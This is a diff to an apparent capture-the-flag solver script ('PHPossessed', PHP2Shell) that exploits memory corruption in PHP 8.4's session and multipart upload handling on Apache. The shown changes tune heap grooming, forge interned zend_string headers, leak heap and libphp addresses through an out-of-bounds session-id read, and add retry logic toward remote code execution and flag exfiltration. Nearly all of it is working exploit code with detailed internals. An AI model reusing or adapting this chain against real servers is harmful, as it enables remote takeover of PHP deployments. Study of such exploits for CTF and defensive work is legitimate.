@@ -46,6 +46,14 @@ BOUNDARY = b"C" * 10
 Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
 LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
 MAIN_BUCKET_COUNT = 87  # stable fingerprint of the main-chunk bucket
+DUP_SLOTS = 4           # duplicate A1 fields that free main-chunk slots (see build_a1)
+# B1 target: a script that is standalone and prints nothing.  The leak is
+# emitted during request startup, but Apache only flushes it once the request
+# finishes, and ps_close_files() has by then freed A1's stale ps_files struct --
+# live memory in this request -- so a bin free list is poisoned.  Compiling the
+# whole front controller trips over it; registry.php defines functions, emits no
+# output and allocates little enough to get the response out.
+LEAK_PATH = "/registry.php"
 FLAG_RE = re.compile(rb"ccsCTF\{[^}\s]+\}")
 
 # x86_64 offsets into libphp.so for the pinned php:8.4.26-apache image.
@@ -99,6 +107,15 @@ def build_a1() -> bytes:
         out.extend(b"\r\n" + value + b"\r\n")
 
     part(b"PHPSESSID", b"\x00")
+    # Free MAIN-CHUNK small slots for the session init to reuse.  Sending the
+    # same field name twice makes zend_hash_update release the first (early,
+    # main-chunk) value, and ZendMM hands small slots out LIFO, so s_open's
+    # basedir ("/tmp", bin 32) lands in the main chunk instead of in a chunk
+    # that is unmapped when the request bails out.  Without this, B1's
+    # ps_close_files -> efree(basedir) hits a chunk whose header is gone and
+    # panics with "zend_mm_heap corrupted" before the leak is ever sent.
+    for i in range(DUP_SLOTS):
+        part(b"d%03d" % i, b"e" * 7)
     for i in range(parts):
         name = ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)
         if i == 0:
@@ -122,6 +139,8 @@ def build_a1() -> bytes:
         part(("b%04d" % i).encode(), b"B" * big_len)
     for i in range(burners):
         part(("u%02d" % i).encode(), b"U" * burner_len)
+    for i in range(DUP_SLOTS):            # overwrite -> frees the slots above
+        part(b"d%03d" % i, b"l" * 7)
     part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
     out.extend(b"--" + BOUNDARY + b"--\r\n")
     return bytes(out)
@@ -133,12 +152,21 @@ def _forge_fill_value(pages: int, page: int, fake_len: int, idx: int) -> bytes:
     length = pages * 4096 - 25
     v = bytearray(b"A" * length)
     hdr = page * 0x1000 - 0x1018
-    if 0 <= hdr and hdr + 0x18 + 8 <= length:
+    if 0 <= hdr and hdr + 0x18 + 32 <= length:
         struct.pack_into("<I", v, hdr + 0x00, 0)
-        struct.pack_into("<I", v, hdr + 0x04, 0x16)      # IS_STRING
+        # IS_STRING | IS_STR_INTERNED, not a plain 0x16: php_session_initialize
+        # hands PS(id) to the files handler and the rfc1867 END event then runs
+        # php_rshutdown_session_globals -> zend_string_release(PS(id)).  Marking
+        # the forged header interned makes that release a no-op; otherwise it
+        # efree()s an address inside this fill and poisons a small-bin free list.
+        struct.pack_into("<I", v, hdr + 0x04, 0x106)
         struct.pack_into("<Q", v, hdr + 0x08, 0)
         struct.pack_into("<Q", v, hdr + 0x10, fake_len)
-        v[hdr + 0x18:hdr + 0x18 + 8] = b"/" + ("%02d" % (idx % 100)).encode() + b"BBBBB"
+        # php_session_start() runs strpbrk(ZSTR_VAL(id), "\r\n\t <>'\"\\") and
+        # drops PS(id) on a hit, so the forged value has to be a plausible,
+        # NUL-terminated session key -- a leading "/" loses the whole leak.
+        key = (b"zz%02x%03xzz" % (idx % 256, page)).ljust(31, b"a")[:31]
+        v[hdr + 0x18:hdr + 0x18 + 32] = key + b"\x00"
     return bytes(v)
 
 
@@ -411,7 +439,7 @@ def run_chain(host: str, port: int, deadline: float) -> bytes | None:
 
     print("[2/4] B1: stale session id OOB read -> heap + libphp leak")
     t0 = time.monotonic()
-    resp = send_chunked(host, port, "/index.php", build_leak_b(), timeout=120)
+    resp = send_chunked(host, port, LEAK_PATH, build_leak_b(), timeout=120)
     print("      B1 -> %s (%d bytes, %.1fs)" % (
         status_of(resp), len(resp), time.monotonic() - t0))
     try:
@@ -422,16 +450,15 @@ def run_chain(host: str, port: int, deadline: float) -> bytes | None:
     prof = info["profile"]
     print("      arch=%s libphp=%#x candidates=%s" % (
         info["arch"], info["lib"], [hex(b) for b in info["main_candidates"]]))
-    if not info["main_candidates"]:
-        print("      no main-chunk candidate")
-        return None
-    delta = info["lib"] - info["main_candidates"][0]
-    if not (prof["delta_min"] <= delta <= prof["delta_max"]):
-        print("      implausible libphp-main delta %#x; re-leak" % delta)
+    cands = [c for c in info["main_candidates"]
+             if prof["delta_min"] <= info["lib"] - c <= prof["delta_max"]]
+    if not cands:
+        print("      no main-chunk candidate with a plausible delta "
+              "(saw %s); re-leak" % [hex(info["lib"] - c) for c in info["main_candidates"]])
         return None
 
     zif = info["lib"] + prof["zif_offset"]
-    for cand in info["main_candidates"]:
+    for cand in cands:
         if time.monotonic() > deadline:
             print("      out of time")
             return None
@@ -458,7 +485,7 @@ def main() -> int:
     parser = argparse.ArgumentParser(description="PHPossessed solver (PHP2Shell)")
     parser.add_argument("host", nargs="?", default="127.0.0.1")
     parser.add_argument("port", nargs="?", default=32003, type=int)
-    parser.add_argument("--retries", type=int, default=3)
+    parser.add_argument("--retries", type=int, default=14)
     args = parser.parse_args()
 
     if len(EXFIL_CMD) > 200:
@@ -474,6 +501,10 @@ def main() -> int:
     started = time.monotonic()
     deadline = started + 50  # leave headroom to print before the 60s budget
     for attempt in range(1, args.retries + 1):
+        # a failed attempt leaves the single prefork child respawning; starting
+        # A1 against a dead worker just burns the attempt
+        while not preflight(args.host, args.port) and time.monotonic() < deadline:
+            time.sleep(0.2)
         print("[*] chain attempt %d/%d" % (attempt, args.retries))
         flag = run_chain(args.host, args.port, deadline)
         if flag:
